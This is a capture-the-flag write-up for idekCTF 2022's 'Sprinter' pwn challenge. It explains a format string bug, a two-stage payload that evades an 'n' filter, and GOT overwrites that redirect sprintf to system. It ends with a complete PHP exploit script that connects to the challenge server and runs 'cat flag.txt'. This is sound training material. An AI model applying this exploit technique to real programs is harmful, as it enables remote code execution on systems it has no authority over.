# Sprinter - idekCTF 2022 (pwn, 25 solved, 489p)

## Introduction
Sprinter is a pwn task.

An archive containing a binary and a libc is given.

The libc provided is `Ubuntu GLIBC 2.31-0ubuntu9.9`.

## Reverse engineering
The binary reads the user's input in a buffer on the stack.

There are checks made on this buffer:
- it must not contain any `n`
- its size (calculated with `strlen`) must be below 39

If both checks passe, the binary calls `sprintf(buffer, buffer)`.

```c
char buffer[0x100];

printf("Enter your string into my buffer, located at %p: ", buffer);
fgets(buffer, sizeof(buffer), stdin);

if(NULL == strchr(buffer, 'n'))
	if(strlen(buffer) < 39)
		sprintf(buffer, buffer);
```

## Vulnerability
The vulnerability is obviously a format string vulnerability.

## Exploitation
Since the binary calls `sprintf` with the same source and destination, it means
the buffer will be overwritten as the format string gets executed. This can be
troublesome. An easy way to avoid getting into troubles is to start the format
string with `%s` which will make a copy of the format string in the buffer
(copying itself to itself) and then interpret the rest of the format string.

The exploitation is a bit tricky because the binary checks that the buffer does
not contain an `n` by calling `strchr(buffer, 'n')`. The trick is to have a
format string in two stages, separated by a NULL byte. The first stage
"includes" the second stage which contains the actual payload (including the
`%n`).

The binary's GOT is not read-only. On top of that, it is not compiled with PIE.
This means it is possible to overwrite imported functions at a specific address
to take control the program's execution.

Since the output of the format string is bigger than the size of the buffer, it
will overwrite the canary present on the stack, which will call
`__stack_chk_fail`.

Replacing the GOT of `__stack_chk_fail` with the address of the `vuln` makes the
program call `vuln` a second time.

The libc given with this binary uses the following offsets:
```
   161: 0000000000061e20   197 FUNC    GLOBAL DEFAULT   15 sprintf@@GLIBC_2.2.5
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

Notice how the two functions are close to each other. With a favourable ASLR
slide, the functions are located at:
```
... 06 fe 20 sprintf
... 06 02 90 system
```

Which means it is possible to redirect calls from `sprintf` to `system` by
changing only the 16 least significant bits of the GOT, with a chance of 1/16 on
average.

The `system` function is then called with the input provided by the user,
resulting in remote code execution.

**Flag**: `idek{help!_sprintf_ate_my_payload_and_i_cant_get_it_back!}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
const LOCAL = false;
const HOST  = "sprinter.chal.idek.team";
const PORT  = 1337;

function expect_check(string $left, string $right)
{
	if($left !== $right) {
		fprintf(STDERR, "Wanted: %s\n", $left);
		fprintf(STDERR, "Got:    %s\n", $right);
		throw new Exception("Unexpected data");
	}
}

function expect($fp, string $str)
{
	$data = fread($fp, strlen($str));
	expect_check($str, $data);
}

function expectLine($fp, string $line)
{
	$data = fgets($fp);
	expect_check("$line\n", $data);
}

function line($fp) : string
{
	$line = fgets($fp);

	if("\n" !== substr($line, -1))
		throw new Exception("fgets did not return a line");

	return substr($line, 0, -1);
}

function prompt($fp) : int
{
	expect($fp, "Enter your string into my buffer, located at 0x");
	$hex = fread($fp, strlen("7af7320965c0"));
	expect($fp, ": ");
	return hexdec($hex);
}

printf("[*] Opening connection\n");
$time = microtime(true);

$fp = fsockopen(HOST, PORT);

if(!LOCAL)
	expectLine($fp, "== proof-of-work: disabled ==");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$addr = prompt($fp);
printf("[+] Buffer: %X\n", $addr);

$payload  = "%s"; // rdx
$payload .= "%c"; // rcx
$payload .= "%c"; // r8
$payload .= "%d"; // r9

$payload .= "%c"; // stack + 0
$payload .= "%c"; // stack + 8
$payload .= "%c"; // stack + 0x10
$payload .= "%s"; // stack + 0x18
$payload  = str_pad($payload, 0x18, "\x00");

$payload .= pack("P", $addr + strlen($payload) + 8);
$payload .= "%4\$c"; // NULL byte

$c = fn($n) => sprintf("%%%03dc", 0xFF & $n);
$n = fn($i) => sprintf("%%%d\$hhn", $i);

$size = 0x50;

$payload .= $c(0x90 - $size);
$payload .= $n(33);
$size     = 0x90;

$payload .= $c(0xF6 - $size);
$payload .= $n(35);
$size     = 0xF6;

$payload .= $c(0x02 - $size);
$payload .= $n(34);
$size     = 0x02;

$payload .= $c(0x11 - $size);
$payload .= $n(36);
$size     = 0x11;

$pool = [
	0x00404048, // 33: sprintf
	0x00404049, // 34: sprintf + 1

	0x00404020, // 35: stack_chk_fail
	0x00404021, // 36: stack_chk_fail + 1
];

$payload  = str_pad($payload, 0x100 - 8 * sizeof($pool), "\x00");
$payload .= pack("P*", ... $pool);
$payload  = substr($payload, 0, 0xFF);

fwrite($fp, $payload);

prompt($fp);
fwrite($fp, "cat flag.txt\n");

while($buffer = fread($fp, 4096))
	echo $buffer;
```
